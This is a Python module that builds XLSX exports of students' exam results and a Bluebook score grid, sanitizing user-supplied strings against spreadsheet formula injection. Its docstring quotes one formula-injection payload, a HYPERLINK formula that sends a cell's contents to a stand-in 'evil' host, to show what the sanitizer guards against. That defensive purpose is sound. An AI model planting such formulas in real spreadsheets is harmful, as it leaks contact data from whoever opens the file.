"""XLSX builders for the exam-results grid and the Bluebook group grid.

Every user-controlled string goes through
:func:`src.services.excel_export_service.sanitize_spreadsheet_value`. These are the
first exports in the codebase to carry student and parent contact details, so a name
like ``=HYPERLINK("http://evil/?x="&A1,"Click")`` would otherwise become a live
formula in a curator's spreadsheet.

Phone numbers and Telegram tags are written as text, not numbers, so a leading ``+``
survives and long digit strings are not reformatted into scientific notation.
"""
from io import BytesIO
from typing import List

from openpyxl import Workbook
from openpyxl.styles import Alignment, Font, PatternFill
from openpyxl.utils import get_column_letter

from src.exams.schemas import BluebookGridOut, ExamResultRow
from src.services.excel_export_service import sanitize_spreadsheet_value

_HEADER_FILL = PatternFill(start_color="FF4472C4", end_color="FF4472C4", fill_type="solid")
_HEADER_FONT = Font(bold=True, color="FFFFFFFF")
_SUBHEADER_FILL = PatternFill(start_color="FFD9E1F2", end_color="FFD9E1F2", fill_type="solid")


def _text_cell(ws, row: int, col: int, value):
    """Write a value as literal text, sanitized.

    Used for phones and Telegram tags: '+77071064065' must keep its leading plus and
    must not be coerced to a number.
    """
    cell = ws.cell(row=row, column=col, value=sanitize_spreadsheet_value(value))
    if isinstance(value, str):
        cell.number_format = "@"
    return cell


def build_exam_results_workbook(rows: List[ExamResultRow], *, exam_type: str) -> BytesIO:
    """One sheet: student identity + contacts + the exam result."""
    wb = Workbook()
    ws = wb.active
    ws.title = f"{exam_type.upper()} results"

    is_sat = exam_type == "sat"
    is_ielts = exam_type == "ielts"

    headers = [
        "Student", "Group", "Student phone", "Telegram", "Parent name", "Parent phone",
        "Planned date", "Test date",
    ]
    if is_sat:
        headers += ["Verbal", "Math", "Total"]
    elif is_ielts:
        headers += ["Listening", "Reading", "Writing", "Speaking", "Overall"]
    else:
        headers += ["Total"]
    headers += ["Status", "Source", "Proof"]

    for col, header in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=header)
        cell.fill = _HEADER_FILL
        cell.font = _HEADER_FONT
        cell.alignment = Alignment(horizontal="center", vertical="center")

    for idx, row in enumerate(rows, 2):
        s = row.student
        r = row.result
        col = 1
        _text_cell(ws, idx, col, s.full_name); col += 1
        _text_cell(ws, idx, col, row.group_name or ""); col += 1
        # Absent contact data is written as an em dash rather than an empty cell, so a
        # reader can tell "we don't have it" from "nobody filled this column in".
        _text_cell(ws, idx, col, s.student_phone or "—"); col += 1
        _text_cell(ws, idx, col, s.telegram_tag or "—"); col += 1
        _text_cell(ws, idx, col, s.parent_full_name or "—"); col += 1
        _text_cell(ws, idx, col, s.parent_phone or "—"); col += 1

        ws.cell(row=idx, column=col,
                value=row.planned_test_date.isoformat() if row.planned_test_date else "—"); col += 1
        ws.cell(row=idx, column=col,
                value=r.test_date.isoformat() if r else "—"); col += 1

        if is_sat:
            ws.cell(row=idx, column=col, value=r.verbal_score if r else None); col += 1
            ws.cell(row=idx, column=col, value=r.math_score if r else None); col += 1
            ws.cell(row=idx, column=col, value=float(r.total_score) if r else None); col += 1
        elif is_ielts:
            for band in ("listening_band", "reading_band", "writing_band", "speaking_band"):
                v = getattr(r, band) if r else None
                ws.cell(row=idx, column=col, value=float(v) if v is not None else None)
                col += 1
            ws.cell(row=idx, column=col, value=float(r.total_score) if r else None); col += 1
        else:
            ws.cell(row=idx, column=col, value=float(r.total_score) if r else None); col += 1

        _text_cell(ws, idx, col, r.status if r else "—"); col += 1
        _text_cell(ws, idx, col, r.source if r else "—"); col += 1
        # Whether evidence exists - never the storage key, which is PII.
        _text_cell(ws, idx, col, "yes" if (r and r.has_proof) else "no"); col += 1

    ws.freeze_panes = "B2"
    ws.column_dimensions["A"].width = 28
    for c in range(2, len(headers) + 1):
        ws.column_dimensions[get_column_letter(c)].width = 16

    buffer = BytesIO()
    wb.save(buffer)
    buffer.seek(0)
    return buffer


def build_bluebook_grid_workbook(grid: BluebookGridOut) -> BytesIO:
    """Two header rows mirroring the reference sheet: a column-group band over
    Verbal | Math | Score triples, with students as rows."""
    wb = Workbook()
    ws = wb.active
    ws.title = "Bluebook"

    # Title band: group, teacher, start date.
    title_bits = [grid.group_name]
    if grid.teacher_name:
        title_bits.append(grid.teacher_name)
    if grid.start_date:
        title_bits.append(f"Start: {grid.start_date.isoformat()}")
    ws.cell(row=1, column=1, value=sanitize_spreadsheet_value("  |  ".join(title_bits))).font = Font(bold=True, size=12)

    ws.cell(row=2, column=1, value="Student").fill = _HEADER_FILL
    ws.cell(row=2, column=1).font = _HEADER_FONT
    ws.cell(row=2, column=2, value="ID").fill = _HEADER_FILL
    ws.cell(row=2, column=2).font = _HEADER_FONT

    col = 3
    for column in grid.columns:
        label = column.label
        if column.due_date:
            label = f"{label}\n{column.due_date.strftime('%d.%m')}"
        head = ws.cell(row=2, column=col, value=sanitize_spreadsheet_value(label))
        head.fill = _HEADER_FILL
        head.font = _HEADER_FONT
        head.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
        ws.merge_cells(start_row=2, start_column=col, end_row=2, end_column=col + 2)
        for offset, sub in enumerate(("Verbal", "Math", "Score")):
            c = ws.cell(row=3, column=col + offset, value=sub)
            c.fill = _SUBHEADER_FILL
            c.alignment = Alignment(horizontal="center")
        col += 3

    official_col = col
    ws.cell(row=2, column=official_col, value="Official result").fill = _HEADER_FILL
    ws.cell(row=2, column=official_col).font = _HEADER_FONT
    ws.merge_cells(start_row=2, start_column=official_col, end_row=2, end_column=official_col + 1)
    ws.cell(row=3, column=official_col, value="Score").fill = _SUBHEADER_FILL
    ws.cell(row=3, column=official_col + 1, value="Date").fill = _SUBHEADER_FILL

    for idx, row in enumerate(grid.rows, 4):
        _text_cell(ws, idx, 1, row.full_name)
        _text_cell(ws, idx, 2, row.display_id or "")
        col = 3
        for column in grid.columns:
            cell = row.cells.get(column.key) or {}
            state = cell.get("state")
            if state == "submitted":
                ws.cell(row=idx, column=col, value=cell["verbal_score"])
                ws.cell(row=idx, column=col + 1, value=cell["math_score"])
                ws.cell(row=idx, column=col + 2, value=cell["total_score"])
            else:
                # Spell the reason out rather than leaving a blank: a reader cannot
                # tell "did not submit" from "was never assigned" otherwise.
                note = "not assigned" if state == "not_assigned" else "not submitted"
                merged = ws.cell(row=idx, column=col, value=note)
                merged.alignment = Alignment(horizontal="center")
                merged.font = Font(italic=True, color="FF808080")
                ws.merge_cells(start_row=idx, start_column=col,
                               end_row=idx, end_column=col + 2)
            col += 3
        if row.official_result:
            ws.cell(row=idx, column=official_col, value=float(row.official_result.total_score))
            ws.cell(row=idx, column=official_col + 1,
                    value=row.official_result.test_date.isoformat())

    ws.freeze_panes = "C4"
    ws.column_dimensions["A"].width = 30
    ws.column_dimensions["B"].width = 10
    for c in range(3, official_col + 2):
        ws.column_dimensions[get_column_letter(c)].width = 9

    buffer = BytesIO()
    wb.save(buffer)
    buffer.seek(0)
    return buffer
